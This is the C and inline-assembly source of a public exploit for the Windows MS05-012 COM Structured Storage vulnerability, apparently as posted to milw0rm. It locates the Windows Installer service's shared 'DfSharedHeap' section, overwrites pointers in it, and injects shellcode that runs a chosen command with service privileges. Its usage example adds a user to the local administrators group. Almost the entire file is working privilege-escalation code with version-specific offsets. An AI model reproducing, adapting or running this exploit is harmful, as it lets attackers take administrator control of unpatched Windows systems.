// by Cesar Cerrudo - Argeniss - www.argeniss.com
// MS05-012 - COM Structured Storage Vulnerability - CAN-2005-0047 Exploit
//
// More exploits at www.argeniss.com/products.html
//
// Works on Win2k sp4, WinXP sp2, Win2k3 sp0
// Close all runing programs to avoid possible problems
// If it finds the section and it doesn't work remove section permissions 
// from msiexec service process with WinObj or crash the msiexec service and try again 
// if offsets don't work, debug and change them

#include <windows.h>
#include <stdio.h>

typedef struct _LSA_UNICODE_STRING {  
	USHORT Length;  
	USHORT MaximumLength; 
	PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJDIR_INFORMATION {
  UNICODE_STRING          ObjectName;
  UNICODE_STRING          ObjectTypeName;
  BYTE                    Data[1];
} OBJDIR_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef DWORD (WINAPI* MSIINSTALLPRODUCT)(LPCSTR szPackagePath, LPCSTR szCommandLine);
MSIINSTALLPRODUCT MsiInstallProduct;

typedef DWORD (WINAPI* NTQUERYDIRECTORYOBJECT)( HANDLE, OBJDIR_INFORMATION*, DWORD, DWORD ,DWORD,DWORD*,DWORD* );
NTQUERYDIRECTORYOBJECT NtQueryDirectoryObject;

typedef DWORD (WINAPI* NTOPENDIRECTORYOBJECT)( HANDLE *, DWORD,OBJECT_ATTRIBUTES* );
NTOPENDIRECTORYOBJECT  NtOpenDirectoryObject;


DWORD WINAPI  LoadWinInstaller(LPVOID lpParam) 
{ 
	HMODULE hMsi;

	hMsi = LoadLibrary("msi.dll"); 
	MsiInstallProduct = (MSIINSTALLPRODUCT)GetProcAddress(hMsi, "MsiInstallProductA");
  //run unistall , without permissions this makes a windows pop up
  //while this window is showing the shared section is created and available on Windows Installer service process
	MsiInstallProduct((char*)lpParam,"REMOVE=ALL");
  
	return 0; 
} 



int main(int argc, char* argv[])
{

  OBJDIR_INFORMATION *ssinfo  =(OBJDIR_INFORMATION* ) HeapAlloc(GetProcessHeap(), 0, 0x800);

  HANDLE hFile,hThread,hMapFile; 
  HMODULE hNtdll ,hKernel;
  DWORD dwThreadId; 
  OBJECT_ATTRIBUTES obj;
  WCHAR  * uString=L"\\BaseNamedObjects";
  UNICODE_STRING str;
  DWORD i,a,iStrLen,b=0;
  char sObjName[30],sTmp[50];
  LPVOID lpMapAddress;
  FARPROC pWinExec,pExitThread;
  bool bFound;
  char* sCommand;


  if (!argv[1]||!argv[2]) {
	printf("\nUsage :\n	SSExploit \"Applicatoin to uninstall\" \"command\" \n");
	printf("\nExamples :\n  SSExploit \"c:\\windows\\system32\\webfldrs.msi\" \"cmd.exe\" (cmd.exe will interactively run on Win2k only) \n  SSExploit \"c:\\windows\\system32\\webfldrs.msi\" \"net localgroup administrators /add youruser\" \n");
	exit(0);
  }
    
  iStrLen=strlen(argv[2]);

  if(iStrLen>=65){
	printf("\n\"command\" must be less than 65 chars.\n");
	exit(0);
  }

  sCommand=argv[2];

  hThread = CreateThread(NULL,0,LoadWinInstaller,argv[1],0,&dwThreadId); 

  Sleep(3000);

  hNtdll = LoadLibrary("ntdll.dll");    

  NtQueryDirectoryObject = (NTQUERYDIRECTORYOBJECT )GetProcAddress(hNtdll,"NtQueryDirectoryObject");
  NtOpenDirectoryObject = (NTOPENDIRECTORYOBJECT )GetProcAddress(hNtdll,"NtOpenDirectoryObject");
  
  str.Length=wcslen(uString)*2;
  str.MaximumLength =wcslen(uString)*2+2;
  str.Buffer =uString;

  InitializeObjectAttributes (&obj, &str, 0, 0, 00);
  NtOpenDirectoryObject(&hFile,0x20001,&obj);

  printf("\nSearching for Shared Section...\n\n"); 

  // Get all objects names under \BaseNamedObjects

  if (NtQueryDirectoryObject(hFile,ssinfo,0x800,TRUE,TRUE,&b,&a)==0){
	do{ 
		bFound=NULL;
		while (NtQueryDirectoryObject(hFile,ssinfo,0x800,TRUE,FALSE,&b,&a)==0){
		  //check if it's a section name	
			if (!wcscmp(ssinfo->ObjectTypeName.Buffer ,L"Section")){             
				for (i=0;(i<=wcslen(ssinfo->ObjectName.Buffer))&(i<30);i++){
					sObjName[i]=(char)ssinfo->ObjectName.Buffer[i];
				}
		      //check if it's the one we are searching for
				if (!strncmp(sObjName,"DfSharedHeap",12)){      
					bFound=1;
					break;
				}
			}
		}
		if (bFound)
			printf("Shared Section Found: %s\n",sObjName);
		else {
			printf("Shared Section Not Found");
			exit(0);
		}
    
		strcpy(sTmp,"Global\\");
		strcat(sTmp,sObjName);    //append global prefix to support Terminal Services	

		hMapFile = OpenFileMapping(FILE_MAP_WRITE, FALSE,sTmp); 
	
      //the shared section name couldn't be the one we are searching for
		if (hMapFile == NULL) 
			printf("Could not open Shared Section\n\n"); 
		else
			printf("Shared Section opened\n\n"); 
	
	} while (hMapFile == NULL) ;

	lpMapAddress = MapViewOfFile(hMapFile, FILE_MAP_WRITE,0,0,0);
 
	if (lpMapAddress == NULL) { 
		printf("Could not map Shared Section"); 
		exit(0);
	}
	else 
		printf("Shared Section Mapped\n\nOverwriting Pointer and Inyecting Shellcode...\n\n"); 

	hKernel=LoadLibrary("Kernel32.dll");
	
	pWinExec=GetProcAddress(hKernel,"WinExec");
	pExitThread=GetProcAddress(hKernel,"ExitThread");

	_asm{
			
		mov eax,fs:[30h]   // get pointer to PEB 
		mov eax,[eax+0A8h] // get OS minor version
		cmp eax,0x0
		jz W2ksp4
		cmp eax,0x1        
		jz WinXPsp2
		jmp Win2K3   // address of section seems static on same OS version
					
	W2Ksp4:
		mov eax,0x0101FFF0 // address of begining of section - 0x10 used to overwrite pointer
		mov edx,0x01020004 // address of shellcode
		jmp Done
	
	WinXPsp2:
		mov eax,0x0086FFF0 // address of begining of section - 0x10 used to overwrite pointer
		mov edx,0x00870004 // address of shellcode
		jmp Done
	
	Win2K3:
		mov eax,0x007BFFF0 // address of begining of section - 0x10 used to overwrite pointer
		mov edx,0x007C0004 // address of shellcode

	Done:
		mov ebx,lpMapAddress
		mov ecx, 0x1000

	l00p:                  // overwrite section data, so overwriten structures will point to shellcode
		mov dword ptr[ebx],eax 
		sub ecx,0x4
		add ebx,0x4

		cmp ecx,0x0
		jnz l00p

		mov ebx,lpMapAddress  //address of shellcode
		mov dword ptr[ebx],edx                    
		
	//start copying shellcode
    
		lea esi, Shellcode
		lea edi, [ebx+4]
		lea ecx, End
		sub ecx, esi
		push esi
		push edi
		cld
		rep movsb

		pop edi
		pop esi
		push edi
		lea ecx, CommandBuf
		sub ecx, esi
		add edi, ecx
		mov esi, sCommand
		mov ecx, iStrLen
		rep movsb
		mov [edi], 0x00

		pop edi
		mov esi, pWinExec
		mov [edi+0x5], esi

		mov esi, pExitThread
		mov [edi+0x9], esi

	}

	printf("Command should have been executed ;)\n"); 
	CloseHandle(hMapFile);

  }
  else printf("Couldn't get object names \n");	

  return 0;

	_asm{

	Shellcode:
		call getDelta
				// this gets overwrited
		mov ax,0xffff	
		mov ax,0xffff	

	CommandBuf:					// this gets overwrited
		mov dword ptr[eax],0x55555555
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	
		mov dword ptr[eax],0x55555555	

	getDelta:
		pop edx							// Get shellcode/shared section pointer
		push edx						// save edx

		push 0x1						// push 0x0 for hidden window
		lea eax, [edx+0x8]					
		push eax						// Command offset
		call [edx]						// Call WinExec
       
		pop edx
		call [edx+0x4]					// Call ExitThread to avoid msiexec service to crash

	End:
	}
}

// milw0rm.com [2005-05-31]
